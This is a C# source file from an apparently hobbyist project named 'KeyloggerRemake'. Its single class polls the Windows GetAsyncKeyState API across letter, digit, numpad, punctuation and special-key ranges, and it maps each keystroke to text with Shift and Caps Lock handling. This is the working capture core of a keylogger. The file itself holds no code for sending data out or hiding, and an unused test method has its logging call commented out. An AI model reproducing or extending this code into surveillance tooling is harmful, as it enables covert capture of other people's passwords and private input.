using System;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace KeyloggerRemake
{
    public class classGetKeys
    {
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(Keys vKey);

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(Int32 vKey);

        private static bool getShift()
        {
            if (GetAsyncKeyState(Keys.ShiftKey) != 0)
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        private static bool getCapsLock()
        {
            bool capsLock;
            capsLock = Console.CapsLock;

            return capsLock;
        }

        public static string checkAlphabet()
        {
            string strKey = "";

            for (int i = 65; i <= 90; i++)
            {
                int keyPressed = GetAsyncKeyState(i);
                if (keyPressed == -32767)
                {
                    strKey = Convert.ToChar(i).ToString();
                    if (getCapsLock() == true)
                    {
                        if (getShift() == false)
                        {
                            strKey = strKey.ToUpper();
                        }
                        else
                        {
                            strKey = strKey.ToLower();
                        }
                    }
                    else
                    {
                        if (getShift() == true)
                        {
                            strKey = strKey.ToUpper();
                        }
                        else
                        {
                            strKey = strKey.ToLower();
                        }
                    }
                }
            }

            return strKey;
        }

        public static string checkExtraKeys()
        {
            string strKey = "";

            for (int i = 0; i <= 47; i++)
            {
                int keyPressed = GetAsyncKeyState(i);
                if (keyPressed == -32767)
                {
                    switch (i)
                    {
                        case 8:
                            strKey = "[BS] ";
                            break;
                        case 9:
                            strKey = "[Tab] ";
                            break;
                        case 13:
                            strKey = Environment.NewLine;
                            break;
                        case 17:
                            strKey = "[Control] ";
                            break;
                        case 18:
                            strKey = "[Alt] ";
                            break;
                        case 19:
                            strKey = "[Pause] ";
                            break;
                        case 27:
                            strKey = "[Esc] ";
                            break;
                        case 32:
                            strKey = " ";
                            break;
                        case 33:
                            strKey = "[PgUp] ";
                            break;
                        case 34:
                            strKey = "[PgDown] ";
                            break;
                        case 35:
                            strKey = "[End] ";
                            break;
                        case 36:
                            strKey = "[Home] ";
                            break;
                        case 44:
                            strKey = "[PrntSc] ";
                            break;
                        case 45:
                            strKey = "[Ins] ";
                            break;
                    }
                }
            }

            return strKey;
        }

        public static string checkMoreExtraKeys()
        {
            string strKey = "";

            for (int i = 112; i <= 256; i++)
            {
                int keyPressed = GetAsyncKeyState(i);
                if (keyPressed == -32767)
                {
                    if (getShift() == false)
                    {
                        switch (i)
                        {
                            case 144:
                                strKey = "[NumLock] ";
                                break;
                            case 145:
                                strKey = "[ScrollLock] ";
                                break;
                            case 186:
                                strKey = ";";
                                break;
                            case 187:
                                strKey = "=";
                                break;
                            case 188:
                                strKey = ",";
                                break;
                            case 189:
                                strKey = "-";
                                break;
                            case 190:
                                strKey = ".";
                                break;
                            case 191:
                                strKey = "/";
                                break;
                            case 192:
                                strKey = "`";
                                break;
                            case 219:
                                strKey = "[";
                                break;
                            case 220:
                                strKey = "'\'";
                                break;
                            case 221:
                                strKey = "]";
                                break;
                            case 222:
                                strKey = "'";
                                break;
                            case 223:
                                strKey = "`";
                                break;
                            case 255:
                                strKey = "[DEL]";
                                break;
                        }
                    }
                    else
                    {
                        switch (i)
                        {
                            case 186:
                                strKey = ":";
                                break;
                            case 187:
                                strKey = "+";
                                break;
                            case 188:
                                strKey = "<";
                                break;
                            case 189:
                                strKey = "_";
                                break;
                            case 190:
                                strKey = ">";
                                break;
                            case 191:
                                strKey = "?";
                                break;
                            case 192:
                                strKey = "~";
                                break;
                            case 219:
                                strKey = "{";
                                break;
                            case 220:
                                strKey = "|";
                                break;
                            case 221:
                                strKey = "}";
                                break;
                        }
                    }
                }
            }

            return strKey;
        }

        public static string checkNumbersAndAbove()
        {
            string strKey = "";

            for (int i = 48; i <= 57; i++)
            {
                int keyPressed = GetAsyncKeyState(i);
                if (keyPressed == -32767)
                {
                    if (getShift() == true)
                    {
                        switch (Convert.ToChar(i).ToString())
                        {
                            case "1":
                                strKey = "!";
                                break;
                            case "2":
                                strKey = "@";
                                break;
                            case "3":
                                strKey = "#";
                                break;
                            case "4":
                                strKey = "$";
                                break;
                            case "5":
                                strKey = "%";
                                break;
                            case "6":
                                strKey = "^";
                                break;
                            case "7":
                                strKey = "&";
                                break;
                            case "8":
                                strKey = "*";
                                break;
                            case "9":
                                strKey = "(";
                                break;
                            case "0":
                                strKey = ")";
                                break;
                        }
                    }
                    else
                    {
                        strKey = Convert.ToChar(i).ToString();
                    }
                }
            }

            return strKey;
        }

        public static string checkNumpad()
        {
            string strKey = "";

            for (int i = 96; i <= 120; i++)
            {
                int keyPressed = GetAsyncKeyState(i);
                if (keyPressed == -32767)
                {
                    switch (i)
                    {
                        case 96:
                            strKey = "0";
                            break;
                        case 97:
                            strKey = "1";
                            break;
                        case 98:
                            strKey = "2";
                            break;
                        case 99:
                            strKey = "3";
                            break;
                        case 100:
                            strKey = "4";
                            break;
                        case 101:
                            strKey = "5";
                            break;
                        case 102:
                            strKey = "6";
                            break;
                        case 103:
                            strKey = "7";
                            break;
                        case 104:
                            strKey = "8";
                            break;
                        case 105:
                            strKey = "9";
                            break;
                        case 106:
                            strKey = "*";
                            break;
                        case 107:
                            strKey = "+";
                            break;
                        case 109:
                            strKey = "-";
                            break;
                        case 110:
                            strKey = ".";
                            break;
                        case 111:
                            strKey = "/";
                            break;
                    }
                }
            }

            return strKey;
        }

        private void testLogger() //NOT USED - Efficient... but, ineffective.
        {
            while (true)
            {
                for (Int32 i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);
                    if (state == 1 || state == -32767)
                    {
                        //addToLog(Convert.ToChar((Keys)i).ToString());
                    }
                }
            }
        }
    }
}
